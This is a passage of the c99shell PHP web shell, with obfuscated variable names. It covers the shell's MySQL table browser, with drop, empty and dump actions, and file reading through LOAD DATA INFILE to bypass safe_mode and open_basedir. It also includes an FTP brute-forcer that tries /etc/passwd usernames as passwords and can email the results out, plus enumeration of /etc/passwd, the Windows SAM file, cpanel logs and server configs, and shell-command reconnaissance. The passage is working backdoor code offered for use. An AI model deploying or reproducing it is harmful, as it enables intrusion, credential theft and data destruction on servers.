$spa8dd51 = mysql_fetch_array($sp00c808); mysql_free_result($sp00c808); $spaa1993 = mysql_query('SHOW FIELDS FROM `' . $sp0f586b . '`;'); $spa01ae7 = array(); while ($spfe8f01 = mysql_fetch_assoc($spaa1993)) { $spa01ae7[] = $spfe8f01; } if ($sp5e3531 > $sp6e913c) { $sp6e913c = $sp5e3531 + $sp9282a9; } if (empty($sp8f2bdb)) { $sp8f2bdb = 0; } if (empty($spbe470d)) { $spbe470d = 0; } if (empty($sp99c72c)) { $sp99c72c = 30; } $sp9282a9 = $sp99c72c - $spbe470d; if (!is_numeric($sp9282a9)) { $sp9282a9 = 10; } $sp8301e1 = $spa8dd51[0] / $sp9282a9; $spb6aba9 = explode(' ', $speb1c19); if (count($spb6aba9) == 2) { if ($spb6aba9[0] == 'd') { $spa249bd = 'DESC'; } else { $spa249bd = 'ASC'; } $spc85aba = 'ORDER BY `' . $spb6aba9[1] . '` ' . $spa249bd . ' '; } else { $spc85aba = ''; } $sp0beb9d = 'SELECT * FROM `' . $sp0f586b . '` ' . $spc85aba . 'LIMIT ' . $spbe470d . ' , ' . $sp9282a9 . ''; $sp3b8eaf = mysql_query($sp0beb9d) or print mysql_smarterror(); echo '<hr size="1" noshade><center><b>Table ' . htmlspecialchars($sp0f586b) . ' (' . mysql_num_fields($sp3b8eaf) . ' cols and ' . $spa8dd51[0] . ' rows)</b></center>'; echo '<a href="' . $spf40cb4 . 'sql_tbl=' . urlencode($sp0f586b) . '&sql_tbl_act=structure">[&nbsp;<b>Structure</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;'; echo '<a href="' . $spf40cb4 . 'sql_tbl=' . urlencode($sp0f586b) . '&sql_tbl_act=browse">[&nbsp;<b>Browse</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;'; echo '<a href="' . $spf40cb4 . 'sql_tbl=' . urlencode($sp0f586b) . '&sql_act=tbldump&thistbl=1">[&nbsp;<b>Dump</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;'; echo '<a href="' . $spf40cb4 . 'sql_tbl=' . urlencode($sp0f586b) . '&sql_tbl_act=insert">[&nbsp;<b>Insert</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;'; if ($sp5c3fc7 == 'structure') { echo '<br><br><b>Coming sooon!</b>'; } if ($sp5c3fc7 == 'insert') { if (!is_array($spb8ee3f)) { $spb8ee3f = array(); } if (!empty($sp0267a1)) { } else { echo '<br><br><b>Inserting row into table:</b><br>'; if (!empty($spcf5650)) { $sp3d25fd = 'SELECT * FROM `' . $sp0f586b . '`'; $sp3d25fd .= ' WHERE' . $spcf5650; $sp3d25fd .= ' LIMIT 1;'; $sp3b8eaf = mysql_query($sp3d25fd, $sp11a80a) or print '<br><br>' . mysql_smarterror(); $sp843422 = mysql_fetch_assoc($sp3b8eaf); mysql_free_result($sp3b8eaf); } else { $sp843422 = array(); } echo '<form method="POST"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="1%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><b>Field</b></td><td><b>Type</b></td><td><b>Function</b></td><td><b>Value</b></td></tr>'; foreach ($spa01ae7 as $spfb39ee) { $sp6ee69e = $spfb39ee['Field']; if (empty($spcf5650)) { $spc85aba = ''; } echo '<tr><td><b>' . htmlspecialchars($sp6ee69e) . '</b></td><td>' . $spfb39ee['Type'] . '</td><td><select name="sql_tbl_insert_functs[' . htmlspecialchars($sp6ee69e) . ']"><option value=""></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value="">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type="text" name="sql_tbl_insert[' . htmlspecialchars($sp6ee69e) . ']" value="' . htmlspecialchars($sp843422[$sp6ee69e]) . '" size=50></td></tr>'; $spc58e00++; } echo '</table><br>'; echo '<input type="radio" name="sql_tbl_insert_radio" value="1"'; if (empty($spcf5650)) { echo ' checked'; } echo '><b>Insert as new row</b>'; if (!empty($spcf5650)) { echo ' or <input type="radio" name="sql_tbl_insert_radio" value="2" checked><b>Save</b>'; echo '<input type="hidden" name="sql_tbl_insert_q" value="' . htmlspecialchars($spcf5650) . '">'; } echo '<br><br><input type="submit" value="Confirm"></form>'; } } if ($sp5c3fc7 == 'browse') { $spbe470d = abs($spbe470d); $sp99c72c = abs($sp99c72c); echo '<hr size="1" noshade>'; echo '<img src="' . $sp4f5f94 . 'act=img&img=multipage" height="12" width="10" alt="Pages">&nbsp;'; $sp47eda8 = 0; for ($spc58e00 = 0; $spc58e00 < $sp8301e1; $spc58e00++) { if ($spc58e00 * $sp9282a9 != $spbe470d or $spc58e00 * $sp9282a9 + $sp9282a9 != $sp99c72c) { echo '<a href="' . $spf40cb4 . 'sql_tbl=' . urlencode($sp0f586b) . '&sql_order=' . htmlspecialchars($speb1c19) . '&sql_tbl_ls=' . $spc58e00 * $sp9282a9 . '&sql_tbl_le=' . ($spc58e00 * $sp9282a9 + $sp9282a9) . '"><u>'; } echo $spc58e00; if ($spc58e00 * $sp9282a9 != $spbe470d or $spc58e00 * $sp9282a9 + $sp9282a9 != $sp99c72c) { echo '</u></a>'; } if ($spc58e00 / 30 == round($spc58e00 / 30) and $spc58e00 > 0) { echo '<br>'; } else { echo '&nbsp;'; } } if ($spc58e00 == 0) { echo 'empty'; } echo '<form method="GET"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_db" value="' . htmlspecialchars($sp9d6962) . '"><input type="hidden" name="sql_login" value="' . htmlspecialchars($spd99509) . '"><input type="hidden" name="sql_passwd" value="' . htmlspecialchars($sp06d945) . '"><input type="hidden" name="sql_server" value="' . htmlspecialchars($sp9910f1) . '"><input type="hidden" name="sql_port" value="' . htmlspecialchars($sp32067a) . '"><input type="hidden" name="sql_tbl" value="' . htmlspecialchars($sp0f586b) . '"><input type="hidden" name="sql_order" value="' . htmlspecialchars($speb1c19) . '"><b>From:</b>&nbsp;<input type="text" name="sql_tbl_ls" value="' . $spbe470d . '">&nbsp;<b>To:</b>&nbsp;<input type="text" name="sql_tbl_le" value="' . $sp99c72c . '">&nbsp;<input type="submit" value="View"></form>'; echo '<br><form method="POST"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="1%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>'; echo '<tr>'; echo '<td><input type="checkbox" name="boxrow_all" value="1"></td>'; for ($spc58e00 = 0; $spc58e00 < mysql_num_fields($sp3b8eaf); $spc58e00++) { $spc85aba = mysql_field_name($sp3b8eaf, $spc58e00); if ($spb6aba9[0] == 'a') { $spe8dfbe = 'd'; $spe2d462 = 'asc'; } else { $spe8dfbe = 'a'; $spe2d462 = 'desc'; } echo '<td>'; if (empty($spb6aba9[0])) { $spb6aba9[0] = 'a'; } if ($spb6aba9[1] != $spc85aba) { echo '<a href="' . $spf40cb4 . 'sql_tbl=' . $sp0f586b . '&sql_tbl_le=' . $sp99c72c . '&sql_tbl_ls=' . $spbe470d . '&sql_order=' . $spb6aba9[0] . '%20' . $spc85aba . '"><b>' . $spc85aba . '</b></a>'; } else { echo '<b>' . $spc85aba . '</b><a href="' . $spf40cb4 . 'sql_tbl=' . $sp0f586b . '&sql_tbl_le=' . $sp99c72c . '&sql_tbl_ls=' . $spbe470d . '&sql_order=' . $spe8dfbe . '%20' . $spc85aba . '"><img src="' . $sp4f5f94 . 'act=img&img=sort_' . $spe2d462 . '" height="9" width="14" alt="' . $spe2d462 . '"></a>'; } echo '</td>'; } echo '<td><font color="green"><b>Action</b></font></td>'; echo '</tr>'; while ($spfe8f01 = mysql_fetch_array($sp3b8eaf, MYSQL_ASSOC)) { echo '<tr>'; $spfff108 = ''; $spc58e00 = 0; foreach ($spfe8f01 as $spf38c9d => $spc85aba) { $sp6ee69e = mysql_field_name($sp3b8eaf, $spc58e00); $spfff108 .= ' `' . $sp6ee69e . '` = \'' . addslashes($spc85aba) . '\' AND'; $spc58e00++; } if (count($spfe8f01) > 0) { $spfff108 = substr($spfff108, 0, strlen($spfff108) - 3); } echo '<td><input type="checkbox" name="boxrow[]" value="' . $spfff108 . '"></td>'; $spc58e00 = 0; foreach ($spfe8f01 as $spf38c9d => $spc85aba) { $spc85aba = htmlspecialchars($spc85aba); if ($spc85aba == '') { $spc85aba = '<font color="green">NULL</font>'; } echo '<td>' . $spc85aba . '</td>'; $spc58e00++; } echo '<td>'; echo '<a href="' . $spf40cb4 . 'sql_act=query&sql_tbl=' . urlencode($sp0f586b) . '&sql_tbl_ls=' . $spbe470d . '&sql_tbl_le=' . $sp99c72c . '&sql_query=' . urlencode('DELETE FROM `' . $sp0f586b . '` WHERE' . $spfff108 . ' LIMIT 1;') . '"><img src="' . $sp4f5f94 . 'act=img&img=sql_button_drop" alt="Delete" height="13" width="11" border="0"></a>&nbsp;'; echo '<a href="' . $spf40cb4 . 'sql_tbl_act=insert&sql_tbl=' . urlencode($sp0f586b) . '&sql_tbl_ls=' . $spbe470d . '&sql_tbl_le=' . $sp99c72c . '&sql_tbl_insert_q=' . urlencode($spfff108) . '"><img src="' . $sp4f5f94 . 'act=img&img=change" alt="Edit" height="14" width="14" border="0"></a>&nbsp;'; echo '</td>'; echo '</tr>'; } mysql_free_result($sp3b8eaf); echo '</table><hr size="1" noshade><p align="left"><img src="' . $sp4f5f94 . 'act=img&img=arrow_ltr" border="0"><select name="sql_act">'; echo '<option value="">With selected:</option>'; echo '<option value="deleterow">Delete</option>'; echo '</select>&nbsp;<input type="submit" value="Confirm"></form></p>'; } } else { $sp3b8eaf = mysql_query('SHOW TABLE STATUS', $sp11a80a); if (!$sp3b8eaf) { echo mysql_smarterror(); } else { echo '<br><form method="POST"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><input type="checkbox" name="boxtbl_all" value="1"></td><td><center><b>Table</b></center></td><td><b>Rows</b></td><td><b>Type</b></td><td><b>Created</b></td><td><b>Modified</b></td><td><b>Size</b></td><td><b>Action</b></td></tr>'; $spc58e00 = 0; $sp4bc3b5 = $sp1a0377 = 0; while ($spfe8f01 = mysql_fetch_array($sp3b8eaf, MYSQL_ASSOC)) { $sp4bc3b5 += $spfe8f01['Data_length']; $sp1a0377 += $spfe8f01['Rows']; $sp1763a0 = view_size($spfe8f01['Data_length']); echo '<tr>'; echo '<td><input type="checkbox" name="boxtbl[]" value="' . $spfe8f01['Name'] . '"></td>'; echo '<td>&nbsp;<a href="' . $spf40cb4 . 'sql_tbl=' . urlencode($spfe8f01['Name']) . '"><b>' . $spfe8f01['Name'] . '</b></a>&nbsp;</td>'; echo '<td>' . $spfe8f01['Rows'] . '</td>'; echo '<td>' . $spfe8f01['Type'] . '</td>'; echo '<td>' . $spfe8f01['Create_time'] . '</td>'; echo '<td>' . $spfe8f01['Update_time'] . '</td>'; echo '<td>' . $sp1763a0 . '</td>'; echo '<td>&nbsp;<a href="' . $spf40cb4 . 'sql_act=query&sql_query=' . urlencode('DELETE FROM `' . $spfe8f01['Name'] . '`') . '"><img src="' . $sp4f5f94 . 'act=img&img=sql_button_empty" alt="Empty" height="13" width="11" border="0"></a>&nbsp;&nbsp;<a href="' . $spf40cb4 . 'sql_act=query&sql_query=' . urlencode('DROP TABLE `' . $spfe8f01['Name'] . '`') . '"><img src="' . $sp4f5f94 . 'act=img&img=sql_button_drop" alt="Drop" height="13" width="11" border="0"></a>&nbsp;<a href="' . $spf40cb4 . 'sql_tbl_act=insert&sql_tbl=' . $spfe8f01['Name'] . '"><img src="' . $sp4f5f94 . 'act=img&img=sql_button_insert" alt="Insert" height="13" width="11" border="0"></a>&nbsp;</td>'; echo '</tr>'; $spc58e00++; } echo '<tr bgcolor="000000">'; echo '<td><center><b>Â»</b></center></td>'; echo '<td><center><b>' . $spc58e00 . ' table(s)</b></center></td>'; echo '<td><b>' . $sp1a0377 . '</b></td>'; echo '<td>' . $spfe8f01[1] . '</td>'; echo '<td>' . $spfe8f01[10] . '</td>'; echo '<td>' . $spfe8f01[11] . '</td>'; echo '<td><b>' . view_size($sp4bc3b5) . '</b></td>'; echo '<td></td>'; echo '</tr>'; echo '</table><hr size="1" noshade><p align="right"><img src="' . $sp4f5f94 . 'act=img&img=arrow_ltr" border="0"><select name="sql_act">'; echo '<option value="">With selected:</option>'; echo '<option value="tbldrop">Drop</option>'; echo '<option value="tblempty">Empty</option>'; echo '<option value="tbldump">Dump</option>'; echo '<option value="tblcheck">Check table</option>'; echo '<option value="tbloptimize">Optimize table</option>'; echo '<option value="tblrepair">Repair table</option>'; echo '<option value="tblanalyze">Analyze table</option>'; echo '</select>&nbsp;<input type="submit" value="Confirm"></form></p>'; mysql_free_result($sp3b8eaf); } } } } } else { $sp0bab45 = array('', 'newdb', 'serverstatus', 'servervars', 'processes', 'getfile'); if (in_array($spea4e41, $sp0bab45)) { ?>
<table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new DB:</b><form action="<?php  echo $sp4f5f94; ?>
"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newdb"><input type="hidden" name="sql_login" value="<?php  echo htmlspecialchars($spd99509); ?>
"><input type="hidden" name="sql_passwd" value="<?php  echo htmlspecialchars($sp06d945); ?>
"><input type="hidden" name="sql_server" value="<?php  echo htmlspecialchars($sp9910f1); ?>
"><input type="hidden" name="sql_port" value="<?php  echo htmlspecialchars($sp32067a); ?>
"><input type="text" name="sql_newdb" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>View File:</b><form action="<?php  echo $sp4f5f94; ?>
"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="getfile"><input type="hidden" name="sql_login" value="<?php  echo htmlspecialchars($spd99509); ?>
"><input type="hidden" name="sql_passwd" value="<?php  echo htmlspecialchars($sp06d945); ?>
"><input type="hidden" name="sql_server" value="<?php  echo htmlspecialchars($sp9910f1); ?>
"><input type="hidden" name="sql_port" value="<?php  echo htmlspecialchars($sp32067a); ?>
"><input type="text" name="sql_getfile" size="30" value="<?php  echo htmlspecialchars($sp1274dd); ?>
">&nbsp;<input type="submit" value="Get"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php  } if (!empty($spea4e41)) { echo '<hr size="1" noshade>'; if ($spea4e41 == 'newdb') { echo '<b>'; if (mysql_create_db($sp0fc141) and !empty($sp0fc141)) { echo 'DB "' . htmlspecialchars($sp0fc141) . '" has been created with success!</b><br>'; } else { echo 'Can\'t create DB "' . htmlspecialchars($sp0fc141) . '".<br>Reason:</b> ' . mysql_smarterror(); } } if ($spea4e41 == 'serverstatus') { $sp3b8eaf = mysql_query('SHOW STATUS', $sp11a80a); echo '<center><b>Server-status variables:</b><br><br>'; echo '<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>'; while ($spfe8f01 = mysql_fetch_array($sp3b8eaf, MYSQL_NUM)) { echo '<tr><td>' . $spfe8f01[0] . '</td><td>' . $spfe8f01[1] . '</td></tr>'; } echo '</table></center>'; mysql_free_result($sp3b8eaf); } if ($spea4e41 == 'servervars') { $sp3b8eaf = mysql_query('SHOW VARIABLES', $sp11a80a); echo '<center><b>Server variables:</b><br><br>'; echo '<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>'; while ($spfe8f01 = mysql_fetch_array($sp3b8eaf, MYSQL_NUM)) { echo '<tr><td>' . $spfe8f01[0] . '</td><td>' . $spfe8f01[1] . '</td></tr>'; } echo '</table>'; mysql_free_result($sp3b8eaf); } if ($spea4e41 == 'processes') { if (!empty($sp72c462)) { $sp0beb9d = 'KILL ' . $sp72c462 . ';'; $sp3b8eaf = mysql_query($sp0beb9d, $sp11a80a); echo '<b>Killing process #' . $sp72c462 . '... ok. he is dead, amen.</b>'; } $sp3b8eaf = mysql_query('SHOW PROCESSLIST', $sp11a80a); echo '<center><b>Processes:</b><br><br>'; echo '<TABLE cellSpacing=0 cellPadding=2 bgColor=#333333 borderColorLight=#333333 border=1><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td><td><b>Action</b></td></tr>'; while ($spfe8f01 = mysql_fetch_array($sp3b8eaf, MYSQL_NUM)) { echo '<tr><td>' . $spfe8f01[0] . '</td><td>' . $spfe8f01[1] . '</td><td>' . $spfe8f01[2] . '</td><td>' . $spfe8f01[3] . '</td><td>' . $spfe8f01[4] . '</td><td>' . $spfe8f01[5] . '</td><td>' . $spfe8f01[6] . '</td><td>' . $spfe8f01[7] . '</td><td><a href="' . $spf40cb4 . 'sql_act=processes&kill=' . $spfe8f01[0] . '"><u>Kill</u></a></td></tr>'; } echo '</table>'; mysql_free_result($sp3b8eaf); } if ($spea4e41 == 'getfile') { $sp9ac662 = $spd99509 . '_tmpdb'; $sp780f4b = mysql_select_db($sp9ac662); if (!$sp780f4b) { mysql_create_db($sp9ac662); $sp780f4b = mysql_select_db($sp9ac662); $sp382d27 = !!$sp780f4b; } if ($sp780f4b) { $sp382d27 = FALSE; mysql_query('CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );'); mysql_query('LOAD DATA INFILE "' . addslashes($sp1274dd) . '" INTO TABLE tmp_file'); $sp3b8eaf = mysql_query('SELECT * FROM tmp_file;'); if (!$sp3b8eaf) { echo '<b>Error in reading file (permision denied)!</b>'; } else { for ($spc58e00 = 0; $spc58e00 < mysql_num_fields($sp3b8eaf); $spc58e00++) { $sp6ee69e = mysql_field_name($sp3b8eaf, $spc58e00); } $sp77bd8d = ''; while ($spfe8f01 = mysql_fetch_array($sp3b8eaf, MYSQL_ASSOC)) { $sp77bd8d .= join('
', $spfe8f01); } if (empty($sp77bd8d)) { echo '<b>File "' . $sp1274dd . '" does not exists or empty!</b><br>'; } else { echo '<b>File "' . $sp1274dd . '":</b><br>' . nl2br(htmlspecialchars($sp77bd8d)) . '<br>'; } mysql_free_result($sp3b8eaf); mysql_query('DROP TABLE tmp_file;'); } } mysql_drop_db($sp9ac662); } } } } echo '</td></tr></table>'; if ($sp11a80a) { $sp772017 = @mysql_affected_rows($sp11a80a); if (!is_numeric($sp772017) or $sp772017 < 0) { $sp772017 = 0; } echo '<tr><td><center><b>Affected rows: ' . $sp772017 . '</center></td></tr>'; } echo '</table>'; } if ($spabab30 == 'mkdir') { if ($spf38ecb != $sp549585) { if (file_exists($spf38ecb)) { echo '<b>Make Dir "' . htmlspecialchars($spf38ecb) . '"</b>: object alredy exists'; } elseif (!mkdir($spf38ecb)) { echo '<b>Make Dir "' . htmlspecialchars($spf38ecb) . '"</b>: access denied'; } echo '<br><br>'; } $spabab30 = $sp3fc037 = 'ls'; } if ($spabab30 == 'ftpquickbrute') { echo '<b>Ftp Quick brute:</b><br>'; if (!win) { echo 'This functions not work in Windows!<br><br>'; } else { function c99ftpbrutecheck($sp5e2493, $spf65a7b, $spf3b9ce, $spcaff79, $sp7158a0, $spb7c1fd, $sp7eed92) { if ($sp7eed92) { $sp37f733 = !in_array($spb7c1fd, array('/bin/FALSE', '/sbin/nologin')); } else { $sp37f733 = TRUE; } if ($sp37f733) { $spb7af44 = @ftp_connect($sp5e2493, $spf65a7b, $spf3b9ce); if (@ftp_login($spb7af44, $spcaff79, $sp7158a0)) { echo '<a href="ftp://' . $spcaff79 . ':' . $sp7158a0 . '@' . $sp5e2493 . '" target="_blank"><b>Connected to ' . $sp5e2493 . ' with login "' . $spcaff79 . '" and password "' . $sp7158a0 . '"</b></a>.<br>'; ob_flush(); return TRUE; } } } if (!empty($sp58b8eb)) { if (!is_numeric($sp4ca2b7)) { $sp4ca2b7 = $sp6f68d2; } $spe2e680 = fopen('/etc/passwd', 'r'); if (!$spe2e680) { echo 'Can\'t get /etc/passwd for password-list.'; } else { if ($sp74127a) { if ($spbc83f4) { $spadb995 = fopen($spbc83f4, 'w'); } else { $spadb995 = FALSE; } $sp599440 = 'FTP Quick Brute (called c99shell v. ' . $sp703f1a . ') started at ' . date('d.m.Y H:i:s') . '

'; if ($spbc83f4) { fwrite($spadb995, $sp599440, strlen($sp599440)); } } ob_flush(); $spc58e00 = $spc768ec = 0; $spf6efe1 = getmicrotime(); while (!feof($spe2e680)) { $sp6d9eaf = explode(':', fgets($spe2e680, 2048)); if (c99ftpbrutecheck('localhost', 21, 1, $sp6d9eaf[0], $sp6d9eaf[0], $sp6d9eaf[6], $sp7eed92)) { echo '<b>Connected to ' . getenv('SERVER_NAME') . ' with login "' . $sp6d9eaf[0] . '" and password "' . $sp6d9eaf[0] . '"</b><br>'; $sp599440 .= 'Connected to ' . getenv('SERVER_NAME') . ' with login "' . $sp6d9eaf[0] . '" and password "' . $sp6d9eaf[0] . '", at ' . date('d.m.Y H:i:s') . '
'; if ($spadb995) { fseek($spadb995, 0); fwrite($spadb995, $sp599440, strlen($sp599440)); } $spc768ec++; ob_flush(); } if ($spc58e00 > $sp4ca2b7) { break; } $spc58e00++; } if ($spc768ec == 0) { echo 'No success. connections!'; $sp599440 .= 'No success. connections!
'; } $spe447ee = round(getmicrotime() - $spf6efe1, 4); echo '<hr size="1" noshade><b>Done!</b><br>Total time (secs.): ' . $spe447ee . '<br>Total connections: ' . $spc58e00 . '<br>Success.: <font color=green><b>' . $spc768ec . '</b></font><br>Unsuccess.:' . ($spc58e00 - $spc768ec) . '</b><br>Connects per second: ' . round($spc58e00 / $spe447ee, 2) . '<br>'; $sp599440 .= '
------------------------------------------
Done!
Total time (secs.): ' . $spe447ee . '
Total connections: ' . $spc58e00 . '
Success.: ' . $spc768ec . '
Unsuccess.:' . ($spc58e00 - $spc768ec) . '
Connects per second: ' . round($spc58e00 / $spe447ee, 2) . '
'; if ($spadb995) { fseek($spadb995, 0); fwrite($spadb995, $sp599440, strlen($sp599440)); } if ($sp3a24ac) { @mail($sp3a24ac, 'c99shell v. ' . $sp703f1a . ' report', $sp599440); } fclose($spadb995); } } else { $sp1cdc2a = $sp265034 . 'c99sh_ftpquickbrute_' . date('d.m.Y_H_i_s') . '.log'; $sp1cdc2a = str_replace('//', DIRECTORY_SEPARATOR, $sp1cdc2a); echo '<form action="' . $sp4f5f94 . '"><input type=hidden name=act value="ftpquickbrute"><br>Read first: <input type=text name="fqb_lenght" value="' . $sp6f68d2 . '"><br><br>Users only with shell?&nbsp;<input type="checkbox" name="fqb_onlywithsh" value="1"><br><br>Logging?&nbsp;<input type="checkbox" name="fqb_logging" value="1" checked><br>Logging to file?&nbsp;<input type="text" name="fqb_logfile" value="' . $sp1cdc2a . '" size="' . (strlen($sp1cdc2a) + 2 * (strlen($sp1cdc2a) / 10)) . '"><br>Logging to e-mail?&nbsp;<input type="text" name="fqb_logemail" value="' . $sp477235 . '" size="' . (strlen($sp1982ca) + 2 * (strlen($sp1982ca) / 10)) . '"><br><br><input type=submit name=submit value="Brute"></form>'; } } } if ($spabab30 == 'd') { if (!is_dir($sp549585)) { echo '<center><b>Permision denied!</b></center>'; } else { echo '<b>Directory information:</b><table border=0 cellspacing=1 cellpadding=2>'; if (!$sp919bf1) { echo '<tr><td><b>Owner/Group</b></td><td> '; $spd6aa15 = posix_getpwuid(fileowner($sp549585)); $sp87a0ea = posix_getgrgid(filegroup($sp549585)); $spfe8f01[] = ($spd6aa15['name'] ? $spd6aa15['name'] : fileowner($sp549585)) . '/' . ($sp87a0ea['name'] ? $sp87a0ea['name'] : filegroup($sp549585)); } echo '<tr><td><b>Perms</b></td><td><a href="' . $sp4f5f94 . 'act=chmod&d=' . urlencode($sp549585) . '"><b>' . view_perms_color($sp549585) . '</b></a><tr><td><b>Create time</b></td><td> ' . date('d/m/Y H:i:s', filectime($sp549585)) . '</td></tr><tr><td><b>Access time</b></td><td> ' . date('d/m/Y H:i:s', fileatime($sp549585)) . '</td></tr><tr><td><b>MODIFY time</b></td><td> ' . date('d/m/Y H:i:s', filemtime($sp549585)) . '</td></tr></table><br>'; } } if ($spabab30 == 'phpinfo') { @ob_clean(); phpinfo(); c99shexit(); } if ($spabab30 == 'security') { echo '<center><b>Server security information:</b></center><b>Open base dir: ' . $spdcfdcf . '</b><br>'; if (!$sp919bf1) { if ($sp4bcfed) { if ($sp4bcfed == 1) { $sp4bcfed = 0; } echo '<b>*nix /etc/passwd:</b><br>'; if (!is_numeric($spa3061b)) { $spa3061b = 0; } if (!is_numeric($sp794d22)) { $sp794d22 = $sp6f68d2; } echo '<form action="' . $sp4f5f94 . '"><input type=hidden name=act value="security"><input type=hidden name="nixpasswd" value="1"><b>From:</b>&nbsp;<input type="text=" name="nixpwd_s" value="' . $spa3061b . '">&nbsp;<b>To:</b>&nbsp;<input type="text" name="nixpwd_e" value="' . $sp794d22 . '">&nbsp;<input type=submit value="View"></form><br>'; $spc58e00 = $spa3061b; while ($spc58e00 < $sp794d22) { $sp805cc3 = posix_getpwuid($spc58e00); if ($sp805cc3) { $sp805cc3['dir'] = '<a href="' . $sp4f5f94 . 'act=ls&d=' . urlencode($sp805cc3['dir']) . '">' . $sp805cc3['dir'] . '</a>'; echo join(':', $sp805cc3) . '<br>'; } $spc58e00++; } } else { echo '<br><a href="' . $sp4f5f94 . 'act=security&nixpasswd=1&d=' . $sp75ab22 . '"><b><u>Get /etc/passwd</u></b></a><br>'; } } else { $spc85aba = $_SERVER['WINDIR'] . 'epair\\sam'; if (file_get_contents($spc85aba)) { echo '<b><font color=red>You can\'t crack winnt passwords(' . $spc85aba . ') </font></b><br>'; } else { echo '<b><font color=green>You can crack winnt passwords. <a href="' . $sp4f5f94 . 'act=f&f=sam&d=' . $_SERVER['WINDIR'] . '\\repair&ft=download"><u><b>Download</b></u></a>, and use lcp.crack+ Â©.</font></b><br>'; } } if (file_get_contents('/etc/userdomains')) { echo '<b><font color=green><a href="' . $sp4f5f94 . 'act=f&f=userdomains&d=' . urlencode('/etc') . '&ft=txt"><u><b>View cpanel user-domains logs</b></u></a></font></b><br>'; } if (file_get_contents('/var/cpanel/accounting.log')) { echo '<b><font color=green><a href="' . $sp4f5f94 . 'act=f&f=accounting.log&d=' . urlencode('/var/cpanel/') . '"&ft=txt><u><b>View cpanel logs</b></u></a></font></b><br>'; } if (file_get_contents('/usr/local/apache/conf/httpd.conf')) { echo '<b><font color=green><a href="' . $sp4f5f94 . 'act=f&f=httpd.conf&d=' . urlencode('/usr/local/apache/conf') . '&ft=txt"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>'; } if (file_get_contents('/etc/httpd.conf')) { echo '<b><font color=green><a href="' . $sp4f5f94 . 'act=f&f=httpd.conf&d=' . urlencode('/etc') . '&ft=txt"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>'; } if (file_get_contents('/etc/syslog.conf')) { echo '<b><font color=green><a href="' . $sp4f5f94 . 'act=f&f=syslog.conf&d=' . urlencode('/etc') . '&ft=txt"><u><b>Syslog configuration (syslog.conf)</b></u></a></font></b><br>'; } if (file_get_contents('/etc/motd')) { echo '<b><font color=green><a href="' . $sp4f5f94 . 'act=f&f=motd&d=' . urlencode('/etc') . '&ft=txt"><u><b>Message Of The Day</b></u></a></font></b><br>'; } if (file_get_contents('/etc/hosts')) { echo '<b><font color=green><a href="' . $sp4f5f94 . 'act=f&f=hosts&d=' . urlencode('/etc') . '&ft=txt"><u><b>Hosts</b></u></a></font></b><br>'; } function displaysecinfo($sp6ee69e, $sp0945f4) { if (!empty($sp0945f4)) { if (!empty($sp6ee69e)) { $sp6ee69e = '<b>' . $sp6ee69e . ' - </b>'; } echo $sp6ee69e . nl2br($sp0945f4) . '<br>'; } } displaysecinfo('OS Version?', myshellexec('cat /proc/version')); displaysecinfo('Kernel version?', myshellexec('sysctl -a | grep version')); displaysecinfo('Distrib name', myshellexec('cat /etc/issue.net')); displaysecinfo('Distrib name (2)', myshellexec('cat /etc/*-realise')); displaysecinfo('CPU?', myshellexec('cat /proc/cpuinfo')); displaysecinfo('RAM', myshellexec('free -m')); displaysecinfo('HDD space', myshellexec('df -h')); displaysecinfo('List of Attributes', myshellexec('lsattr -a')); displaysecinfo('Mount options ', myshellexec('cat /etc/fstab')); displaysecinfo('Is cURL installed?', myshellexec('which curl')); displaysecinfo('Is lynx installed?', myshellexec('which lynx')); displaysecinfo('Is links installed?', myshellexec('which links')); displaysecinfo('Is fetch installed?', myshellexec('which fetch')); displaysecinfo('Is GET installed?', myshellexec('which GET')); displaysecinfo('Is perl installed?', myshellexec('which perl')); displaysecinfo('Where is apache', myshellexec('whereis apache')); displaysecinfo('Where is perl?', myshellexec('whereis perl')); displaysecinfo('locate proftpd.conf', myshellexec('locate proftpd.conf')); displaysecinfo('locate httpd.conf', myshellexec('locate httpd.conf')); displaysecinfo('locate my.conf', myshellexec('locate my.conf')); displaysecinfo('locate psybnc.conf', myshellexec('locate psybnc.conf')); } if ($spabab30 == 'mkfile') { if ($sp71092b != $sp549585) { if (file_exists($sp71092b)) { echo '<b>Make File "' . htmlspecialchars($sp71092b) . '"</b>: object alredy exists'; } elseif (!fopen($sp71092b, 'w')) { echo '<b>Make File "' . 